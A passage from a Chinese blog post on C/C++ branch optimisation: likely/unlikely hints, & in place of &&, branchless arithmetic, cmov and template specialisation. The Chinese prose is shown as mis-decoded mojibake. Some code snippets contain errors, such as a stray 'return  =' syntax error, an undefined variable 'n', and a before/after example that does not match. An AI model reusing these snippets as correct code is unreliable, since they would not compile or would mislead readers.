title="å°†æœ€å¸¸è§çš„caseç§»å‡ºswitch"></a>å°†æœ€å¸¸è§çš„caseç§»å‡ºswitch</h3><p>R.T., e.g.ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">day <span class="hljs-title function_">get_first_workday</span><span class="hljs-params">()</span> {<br>     <span class="hljs-built_in">std</span>::chrono::weekday first_workday = read_first_workday();<br>    <span class="hljs-keyword">if</span> (first_workday == Monday) { <span class="hljs-keyword">return</span> day::Monday; }<br>    <span class="hljs-keyword">switch</span>(first_workday) { <br>        <span class="hljs-keyword">case</span> Tuesday: <span class="hljs-keyword">return</span> day::Tueasday;<br>        ....<br>    };<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="é‡å†™æ¡ä»¶è¿ç»“ç¬¦"><a href="#é‡å†™æ¡ä»¶è¿ç»“ç¬¦" class="headerlink" title="é‡å†™æ¡ä»¶è¿ç»“ç¬¦"></a>é‡å†™æ¡ä»¶è¿ç»“ç¬¦</h3><p>æˆ‘ä»¬ä»ä¸€ä¸ªä¾‹å­å¼•å…¥æ­¤èŠ‚çš„è§‚ç‚¹ï¼Œå‡è®¾æœ‰ä»¥ä¸‹ä»£ç ç‰‡æ®µï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (a[i] &gt; x &amp;&amp; a[i] &lt; y) {<br>    do_something();<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä»æ±‡ç¼–è§’åº¦æ¥çœ‹ï¼š</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">if_not (a[i] &gt; x) goto ENDIF;<br>if_not (a[i] &lt; y) goto ENDIF;<br>do_something;<br>ENDIF<br></code></pre></td></tr></tbody></table></figure><p>è™½ç„¶ a[i] &gt; x å’Œ a[i] &lt; y éƒ½æ˜¯å¾ˆå®¹æ˜“è®¡ç®—çš„ï¼ˆæ‰€æœ‰æ•°æ®éƒ½å·²ç»åœ¨å¯„å­˜å™¨æˆ–è€…ç¼“å­˜ï¼‰ï¼Œä½†éƒ½å¾ˆéš¾é¢„æµ‹ã€‚è¿™é‡Œæˆ‘ä»¬å¦‚æœä½¿ç”¨<code>&amp;</code>è¿ç»“è¿™ä¸¤ä¸ªæ¡ä»¶ï¼Œä¸»è¦çš„ä½œç”¨æœ‰ï¼š</p><ol><li>å¼ºåˆ¶å°†ä¸¤ä¸ªæ¡ä»¶åŒæ—¶è®¡ç®—ï¼ˆå°†ä¸ä¼šæœ‰<code>&amp;&amp;</code>çš„çŸ­è·¯è¿ç®—ï¼‰</li><li>ä½¿æ¡ä»¶æ›´å®¹æ˜“é¢„æµ‹ï¼Œå› è€Œä¼šé™ä½åˆ†æ”¯é¢„æµ‹å‡ºé”™çš„æ¦‚ç‡ï¼šå‡è®¾æ¡ä»¶1ä¸æ¡ä»¶2æ¦‚ç‡å‡ä¸º50%ï¼Œé‚£ä¹ˆå†ä½¿ç”¨<code>&amp;</code>è¿ç»“ç¬¦ä¹‹åï¼Œæ•´ä¸ªåˆ†æ”¯ä¸ºçœŸçš„æ¦‚ç‡ä¸º25%</li><li>å»æ‰ä¸€ä¸ªåˆ†æ”¯</li></ol><p>ç›¸ä¼¼çš„ï¼Œå°†<code>||</code>æ›¿æ¢ä¸º<code>|</code>ä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„ç›®çš„</p><blockquote><p>PS: C++ä¸­boolç±»å‹0è¡¨ç¤ºfalseï¼Œè€Œå…¶ä»–ä»»ä½•æ•°å­—è¡¨ç¤ºtrue</p><p>C++æ ‡å‡†ä¿è¯é€»è¾‘æ“ä½œç¬¦çš„ç»“æœå’Œç®—æœ¯æ¯”è¾ƒçš„ç»“æœæ€»ä¼šä¸º0æˆ–è€…1ï¼Œä½†æ˜¯å¹¶ä¸ä¿è¯æ‰€æœ‰booléƒ½æœ‰è¿™ä¸¤ç±»å€¼çš„å‚ä¸ï¼Œå› æ­¤å¦‚æœéœ€è¦æ ‡å‡†åŒ–boolå˜é‡ï¼Œéœ€è¦<strong>åº”ç”¨<code>!!</code>ç¬¦</strong>ã€‚ï¼ˆæˆ‘ä»¬åœ¨é˜…è¯»Cç±»ä»£ç çš„æ—¶å€™ï¼Œæ—¶å¸¸ä¼šçœ‹åˆ°<code>!!</code>çš„æ“ä½œç¬¦ï¼Œè¯¥æ“ä½œç¬¦å…¶å®å°±æ˜¯å°†ç»“æœæ ‡å‡†åŒ–ä¸ºboolå˜é‡ï¼‰</p></blockquote><h3 id="å‘ŠçŸ¥ç¼–è¯‘å™¨å“ªä¸€ä¸ªåˆ†æ”¯æœ‰æ›´é«˜çš„æ¦‚ç‡"><a href="#å‘ŠçŸ¥ç¼–è¯‘å™¨å“ªä¸€ä¸ªåˆ†æ”¯æœ‰æ›´é«˜çš„æ¦‚ç‡" class="headerlink" title="å‘ŠçŸ¥ç¼–è¯‘å™¨å“ªä¸€ä¸ªåˆ†æ”¯æœ‰æ›´é«˜çš„æ¦‚ç‡"></a>å‘ŠçŸ¥ç¼–è¯‘å™¨å“ªä¸€ä¸ªåˆ†æ”¯æœ‰æ›´é«˜çš„æ¦‚ç‡</h3><p>GCCå’ŒClangæä¾›æŒ‡ç¤ºåˆ†æ”¯æ¦‚ç‡æ€§çš„å…³é”®å­—ï¼š<code>__builtin_expect</code>ï¼Œe.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> likely(x)      __builtin_expect(!!(x), 1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> unlikely(x)    __builtin_expect(!!(x), 0)</span><br><span class="hljs-keyword">if</span> (likely(ptr)) {<br>    ptr-&gt;do_something();<br>}<br></code></pre></td></tr></tbody></table></figure><p>æˆ‘ä»¬åœ¨é˜…è¯»AFLæºç çš„æ—¶å€™ï¼Œä¹Ÿè§‚å¯Ÿåˆ°AFLæºç ä¸­ifè¯­å¥å¤„å¤§é‡ä½¿ç”¨äº†<code>likely(...)</code>ã€<code>unlikely(...)</code>è¯­æ³•ï¼Œå…¶ç›®çš„å°±æ˜¯å¯¹åˆ†æ”¯è¿›è¡Œä¼˜åŒ–ï¼›</p><p>åœ¨åº•å±‚ï¼Œç¼–è¯‘å™¨ä¼šé‡æ’if/elseåˆ†æ”¯è¯­å¥æ‰€å¯¹åº”çš„æŒ‡ä»¤ï¼Œä»¥ä¾¿æ›´æœ‰æ•ˆåœ°ä½¿ç”¨åº•å±‚ç¡¬ä»¶ã€‚</p><blockquote><p>PS: è¿™é‡Œçš„è§è§£å…¶å®æˆ‘ä»¬åœ¨ç¬¬3èŠ‚ä¸­å·²ç»ä»‹ç»è¿‡äº†ï¼Œi.e.</p><p><strong>åœ¨ä¸€äº›å¤„ç†å™¨ä¸Šï¼Œé¡ºåºæ‰§è¡Œæ¯”è·³è½¬çš„å¼€é”€è¦å°å¾ˆå¤šï¼Œè¿™æ ·çš„è¯ï¼Œå‘Šè¯‰ç¼–è¯‘å™¨å¦‚ä½•ç»“æ„åŒ–ä»£ç å°†ä¼šå¸¦æ¥æ›´å¥½çš„æ€§èƒ½</strong></p><p>å› æ­¤ç¼–è¯‘å™¨æ ¹æ®ç”¨æˆ·å®šä¹‰çš„æ¦‚ç‡é‡æ’if/elseè¯­å¥å°†ä¼šå¸¦æ¥æ›´å¥½çš„æ€§èƒ½</p></blockquote><h3 id="ä½¿ç”¨æ— åˆ†æ”¯ç®—æ³•"><a href="#ä½¿ç”¨æ— åˆ†æ”¯ç®—æ³•" class="headerlink" title="ä½¿ç”¨æ— åˆ†æ”¯ç®—æ³•"></a>ä½¿ç”¨æ— åˆ†æ”¯ç®—æ³•</h3><p>ç®€å•æ¥è¯´è¿™é‡Œå…¶å®ä½¿ç”¨äº†ä½è¿ç®—æ¥æ¶ˆé™¤ç®—æ³•ä¸­çš„åˆ†æ”¯ï¼Œe.g. å–ç»å¯¹å€¼å‡½æ•°<code>abs()</code>åœ¨è®¡ç®—æŸä¸€ä¸ªæ•°çš„ç»å¯¹å€¼æ—¶ï¼Œå°±ç”¨äº†ä¸€ä¸ªtrickï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">abs</span><span class="hljs-params">(<span class="hljs-type">int</span> a)</span> {<br>  <span class="hljs-type">int</span> <span class="hljs-type">const</span> mask = <br>        a &gt;&gt; <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>) * CHAR_BIT - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span>  = (a + mask) ^ mask;<br>}<br></code></pre></td></tr></tbody></table></figure><p><span class="github-emoji"><span>â­</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/2b50.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span> ä¸€äº›ä½è¿ç®—çš„å…¶ä»–trickså¯ä»¥å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« <a href="https://graphics.stanford.edu/~seander/bithacks.html#CopyIntegerSign">Bit Twiddling Hacks (stanford.edu)</a></p><h3 id="ä½¿ç”¨æ¡ä»¶è½½å…¥å–ä»£åˆ†æ”¯"><a href="#ä½¿ç”¨æ¡ä»¶è½½å…¥å–ä»£åˆ†æ”¯" class="headerlink" title="ä½¿ç”¨æ¡ä»¶è½½å…¥å–ä»£åˆ†æ”¯"></a>ä½¿ç”¨æ¡ä»¶è½½å…¥å–ä»£åˆ†æ”¯</h3><p>å‡è®¾æœ‰åˆ†æ”¯è¯­å¥ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (x &gt; y) {<br>    x++;<br>}<br></code></pre></td></tr></tbody></table></figure><p>å¯ä»¥å¦‚ä¸‹é‡å†™ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> new_x = x + <span class="hljs-number">1</span>;<br>x = (x &gt; y) ? new_x : x; <span class="hljs-comment">// the compiler should recognize this and emit a conditional branch</span><br></code></pre></td></tr></tbody></table></figure><p>è¿™é‡Œç¬¬2è¡Œçš„è¯­å¥å¯ä»¥è¢«ï¼ˆ<em>condition move</em> - cmovï¼‰æŒ‡ä»¤è¿›è¡Œä¼˜åŒ–ï¼Œå› æ­¤å¯ä»¥åˆ é™¤åˆ†æ”¯</p><h3 id="ä½¿ç”¨ç®—æœ¯è¿ç®—åˆ é™¤åˆ†æ”¯"><a href="#ä½¿ç”¨ç®—æœ¯è¿ç®—åˆ é™¤åˆ†æ”¯" class="headerlink" title="ä½¿ç”¨ç®—æœ¯è¿ç®—åˆ é™¤åˆ†æ”¯"></a>ä½¿ç”¨ç®—æœ¯è¿ç®—åˆ é™¤åˆ†æ”¯</h3><p>e.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// With branch</span><br><span class="hljs-keyword">if</span> (a &gt; b) {<br>    x += y;<br>}<br><span class="hljs-comment">// Branchless</span><br>x += -(a &gt; b) &amp; y; <br></code></pre></td></tr></tbody></table></figure><p>å½“a &gt; bä¸ºå‡æ—¶ï¼Œ-(a &gt; b) &amp; yä¸º0ï¼›å½“a &gt; bä¸ºçœŸæ—¶ï¼Œ-(a &gt; b) = -1 =&gt; -(a &gt; b) &amp; y = -1 &amp; y = y</p><p>å¦å¤–ä¸€ä¸ªä¾‹å­ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// With branch</span><br>x = (a &gt; b) ? val_a : val_b;<br><span class="hljs-comment">// Branchless</span><br>x = val_a;<br>x += -(a &gt; b) &amp; (val_b - val_a);<br></code></pre></td></tr></tbody></table></figure><p>ä¸Šè¿°ç¤ºä¾‹å‡ä½¿ç”¨äº†ç®—æœ¯è¿ç®—æ¥é¿å…åˆ†æ”¯ï¼Œä½†æ ¹æ®CPUåˆ†æ”¯é”™è¯¯é¢„æµ‹æƒ©ç½šå’Œæ•°æ®ç¼“å­˜å‘½ä¸­ç‡ï¼Œ<strong>è¯¥åšæ³•å¯èƒ½ä¼šæé«˜æ€§èƒ½ï¼Œå¯èƒ½ä¹Ÿä¸ä¼š</strong>ï¼Œè¯·æ ¹æ®æƒ…å†µé…Œæƒ…ä½¿ç”¨ï¼ˆæˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œè¿™æ ·åšè½¬åŒ–åï¼Œä»£ç çš„å¯é˜…è¯»æ€§å˜å·®äº†ï¼‰</p><p>æœ€åæ˜¯ä¸€ä¸ªç¯å½¢ç¼“å†²åŒºçš„ä¾‹å­ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// With branch</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_next_element</span><span class="hljs-params">(<span class="hljs-type">int</span> current, <span class="hljs-type">int</span> buffer_len)</span> {<br>    <span class="hljs-type">int</span> next = current + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> (next == buffer_len) {<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    }<br>    <span class="hljs-keyword">return</span> next;<br>}<br><span class="hljs-comment">// Branchless</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_next_element_branchless</span><span class="hljs-params">(<span class="hljs-type">int</span> current, <span class="hljs-type">int</span> buffer_len)</span> {<br>    <span class="hljs-type">int</span> next = current + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">return</span> (next &lt; buffer_len) * next;<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="é‡ç»„ä»£ç æ¥é¿å…åˆ†æ”¯"><a href="#é‡ç»„ä»£ç æ¥é¿å…åˆ†æ”¯" class="headerlink" title="é‡ç»„ä»£ç æ¥é¿å…åˆ†æ”¯"></a>é‡ç»„ä»£ç æ¥é¿å…åˆ†æ”¯</h3><p>è¿™ç§æ–¹å¼å±äºä»£ç é€»è¾‘å±‚é¢çš„é‡ç»„ï¼Œä½¿ç”¨ä¸Šè¾ƒä¸ºçµæ´»ã€‚ä¸‹é¢ä»¥ä¸€ä¸ªåä¸º<code>animation</code>çš„ç±»ä¸ºä¾‹ï¼š</p><p>å‡è®¾ä¸‹è¿°ä»£ç éå†<code>animation_list</code>ä¸­çš„æ¯ä¸€ä¸ª<code>animation</code>å®ä¾‹ï¼Œå¹¶ä¸”æ ¹æ®å®ä¾‹æ˜¯å¦å¯è§æ¥æ‰§è¡Œç›¸åº”çš„æˆå‘˜æ–¹æ³•ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> animation&amp; a: animation_list) {<br>   a.step_a();<br>   <span class="hljs-keyword">if</span> (a.is_visible()) {<br>      a.step_av();<br>   }<br>   a.step_b();<br>   <span class="hljs-keyword">if</span> (a.is_visible) {<br>       a.step_bv();<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä¸€ç§ä¼˜åŒ–çš„æ€è·¯æ˜¯ï¼šæ ¹æ®<code>is_visible()</code>å‡½æ•°çš„ç»“æœå¯¹<code>animation_list</code>ä¸­çš„æ•°æ®è¿›è¡Œæ’åºï¼Œæ¯”å¦‚è¯´æœ€å‰é¢æ”¾ç½®å¯è§çš„å®ä¾‹ï¼Œåé¢æ”¾ç½®éšè—çš„å®ä¾‹ï¼Œå¹¶ä½¿ç”¨ä¸€ä¸ªå˜é‡è®°å½•åˆ†å‰²ç‚¹ï¼›</p><p>å¦ä¸€ç§ä¼˜åŒ–æ€è·¯æ˜¯ï¼šä½¿ç”¨é¢å¤–çš„ä¸¤ä¸ªæ•°ç»„æ¥åˆ†åˆ«å­˜æ”¾å¯è§å’Œéšè—çš„å®ä¾‹ï¼Œanimation_list_visible å’Œ animation_list_hiddenï¼Œé‡å†™åçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> animation&amp; a: animation_list_visible) {<br>   a.step_a();<br>   a.step_av();<br>   a.step_b();<br>   a.step_bv();<br>}<br><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> animation&amp; a: animation_list_hidden) {<br>   a.step_a();<br>   a.step_b();<br>}<br></code></pre></td></tr></tbody></table></figure><h3 id="ä½¿ç”¨æ¨¡æ¿åˆ é™¤åˆ†æ”¯"><a href="#ä½¿ç”¨æ¨¡æ¿åˆ é™¤åˆ†æ”¯" class="headerlink" title="ä½¿ç”¨æ¨¡æ¿åˆ é™¤åˆ†æ”¯"></a>ä½¿ç”¨æ¨¡æ¿åˆ é™¤åˆ†æ”¯</h3><p>å¦‚æœä¸€ä¸ªå¸ƒå°”å‹å˜é‡è¢«ä¼ ç»™å‡½æ•°ä¸”ä½œä¸ºå‡½æ•°çš„ä¸€ä¸ªå‚æ•°ï¼Œé‚£ä¹ˆå¯ä»¥é€šè¿‡ä¼ é€’ä¸€ä¸ªæ¨¡æ¿å‚æ•°æ¥æ¶ˆé™¤å‡½æ•°çš„å‚æ•°ï¼Œe.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">average</span><span class="hljs-params">(<span class="hljs-type">int</span>* <span class="hljs-built_in">array</span>, <span class="hljs-type">int</span> len, <span class="hljs-type">bool</span> include_negatives)</span> {<br>    <span class="hljs-type">int</span> average = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {<br>        <span class="hljs-keyword">if</span> (include_negatives) {<br>            average += <span class="hljs-built_in">array</span>[i];<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">array</span>[i] &gt; <span class="hljs-number">0</span>) {<br>                average += <span class="hljs-built_in">array</span>[i];<br>                count++;<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">if</span> (include_negatives) {<br>         <span class="hljs-keyword">return</span> average / len;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">return</span> average / count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>åœ¨è¿™ä¸ªå‡½æ•°ä¸­ï¼ŒåŒ…å«<code>include_negatives</code>çš„æ¡ä»¶å¯èƒ½ä¼šè¢«è®¡ç®—å¾ˆå¤šæ¬¡ï¼Œä¼ é€’ä¸€ä¸ªæ¨¡æ¿å‚æ•°è€Œä¸æ˜¯å‡½æ•°å‚æ•°å¯ä»¥æœ‰æ•ˆçš„å‡å°‘è¿™ç±»è®¡ç®—ï¼Œå¦‚ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c">template &lt;<span class="hljs-type">bool</span> include_negatives&gt;<br><span class="hljs-type">int</span> <span class="hljs-title function_">average</span><span class="hljs-params">(<span class="hljs-type">int</span>* <span class="hljs-built_in">array</span>, <span class="hljs-type">int</span> len)</span> {<br>    <span class="hljs-type">int</span> average = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> count = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {<br>        <span class="hljs-keyword">if</span> (include_negatives) {<br>            average += <span class="hljs-built_in">array</span>[i];<br>        } <span class="hljs-keyword">else</span> {<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">array</span>[i] &gt; <span class="hljs-number">0</span>) {<br>                average += <span class="hljs-built_in">array</span>[i];<br>                count++;<br>            }<br>        }<br>    }<br>    <span class="hljs-keyword">if</span> (include_negatives) {<br>         <span class="hljs-keyword">return</span> average / len;<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">return</span> average / count;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure><p>ç¼–è¯‘å™¨ä¼šä¸ºä¸Šè¿°ä»£ç ç”Ÿæˆä¸¤ä¸ªç‰ˆæœ¬çš„å‡½æ•°ï¼Œä¸€ä¸ªæ˜¯include_negativesä¸ºçœŸæ—¶çš„ä»£ç ï¼Œä¸€ä¸ªæ˜¯ä¸ºå‡æ—¶çš„ä»£ç ã€‚è¿™æ ·ä¸€æ¥ï¼Œåˆ†æ”¯å°±å®Œå…¨æ¶ˆå¤±äº†ï¼Œæœªä½¿ç”¨çš„åˆ†æ”¯ä¸­çš„ä»£ç ä¹Ÿæ¶ˆå¤±äº†ã€‚ä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨è°ƒç”¨æ—¶æœ‰ç•¥å¾®çš„ä¸åŒï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> avg;<br><span class="hljs-type">bool</span> should_include_negatives = get_should_include_negatives();<br><span class="hljs-keyword">if</span> (should_include_negatives) {<br>    avg = average&lt;<span class="hljs-literal">true</span>&gt;(<span class="hljs-built_in">array</span>, len);<br>} <span class="hljs-keyword">else</span> {<br>    avg = average&lt;<span class="hljs-literal">false</span>&gt;(<span class="hljs-built_in">array</span>, len);<br>}<br></code></pre></td></tr></tbody></table></figure><p>ä»¥ä¸Šå…¶å®æ˜¯ä¸€ç§å«<em>branch optiomization</em>çš„ç¼–è¯‘å™¨ä¼˜åŒ–æŠ€æœ¯ã€‚å¦‚æœinclude_negativeså€¼åœ¨ç¼–è¯‘æ—¶æ˜¯å·²ç»å¾—ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å°†å†³å®šå†…è”å‡½æ•°ï¼Œå¹¶åˆ é™¤åˆ†æ”¯ä»¥åŠæœªä½¿ç”¨çš„ä»£ç ã€‚ä½†æ˜¯ï¼Œå¸¦æ¨¡æ¿çš„è¿™ä¸€ç‰ˆä»£ç èƒ½å¤Ÿä¿è¯ä¸Šè¿°è¿‡ç¨‹ï¼Œè€ŒåŸå§‹ç‰ˆçš„ä»£ç å¹¶ä¸ä¸€å®šèƒ½å¤Ÿä¿è¯ä¸Šè¿°è¿‡ç¨‹ã€‚</p><h3 id="å…¶ä»–çš„ä¸€äº›æŠ€å·§æ¥é¿å…åˆ†æ”¯"><a href="#å…¶ä»–çš„ä¸€äº›æŠ€å·§æ¥é¿å…åˆ†æ”¯" class="headerlink" title="å…¶ä»–çš„ä¸€äº›æŠ€å·§æ¥é¿å…åˆ†æ”¯"></a>å…¶ä»–çš„ä¸€äº›æŠ€å·§æ¥é¿å…åˆ†æ”¯</h3><p>å¦‚æœä»£ç ä¸­æ£€æŸ¥äº†è‹¥å¹²æ¬¡ä¸å¯å˜æ¡ä»¶ï¼Œé‚£ä¹ˆä½ å¯ä»¥é€šè¿‡è¿›è¡Œä»£ç æ‹·è´çš„æ–¹å¼è·å¾—æ›´å¥½çš„æ€§èƒ½ï¼Œe.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (is_visible) {<br>    hide();<br>}<br>process();<br><span class="hljs-keyword">if</span> (is_active) {<br>    display();<br>}<br></code></pre></td></tr></tbody></table></figure><p>å¦‚ä¸‹é‡å†™ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (is_visible) {<br>    hide();<br>    process();<br>    display();<br>} <span class="hljs-keyword">else</span> {<br>    process();<br>}<br></code></pre></td></tr></tbody></table></figure><hr><p>ä½ ä¹Ÿå¯ä»¥å¼•å…¥ä¸¤ä¸ªå…ƒç´ çš„æ•°ç»„ï¼Œä¸€ä¸ªç”¨äºå­˜æ”¾æ¡ä»¶ä¸ºçœŸçš„ç»“æœï¼Œå¦ä¸€ä¸ªç”¨äºå­˜æ”¾æ¡ä»¶ä¸ºå‡çš„ç»“æœï¼Œe.g.</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (is_visible) {<br>    hide();<br>    process();<br>    display();<br>} <span class="hljs-keyword">else</span> {<br>    process();<br>}<br></code></pre></td></tr></tbody></table></figure><p>å¦‚ä¸‹é‡å†™ï¼š</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> result[] = { <span class="hljs-number">0</span>, <span class="hljs-number">0</span> };<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++) {<br>    result[a&gt;i]++;<br>}<br><span class="hljs-keyword">return</span> result[<span class="hljs-number">1</span>];<br></code></pre></td></tr></tbody></table></figure><h2 id="6-æ€»ç»“"><a href="#6-æ€»ç»“" class="headerlink" title="6. æ€»ç»“"></a>6. æ€»ç»“</h2><ul><li>æœ¬æ–‡ä¸»è¦ä»<strong>CPU</strong>ï¼ˆåŒ…æ‹¬ä¸€äº›ä¼˜åŒ–æŠ€æœ¯ï¼‰åŠ<strong>æ±‡ç¼–</strong>çš„è§’åº¦é‡æ–°å®¡è§†ä»£ç ä¸­åˆ†æ”¯å¯¹äºç¨‹åºè¿è¡Œæ€§èƒ½ä¸Šçš„å½±å“ï¼Œå¹¶åœ¨ç¬¬5èŠ‚ä¸­æå‡ºäº†ä¸€äº›ä¼˜åŒ–ç¨‹åºè¿è¡Œæ€§èƒ½çš„æŠ€å·§ï¼Œè¿™äº›æŠ€å·§çš„ä¸»è¦è§è§£æœ‰ä¸¤ä¸ªï¼šä¸€æ˜¯<strong>å‡å°‘ç¨‹åºä¸­åˆ†æ”¯æ•°</strong>ï¼ŒäºŒæ˜¯<strong>å‰ç½®é«˜æ¦‚ç‡åˆ†æ”¯</strong>ï¼›</li><li><a 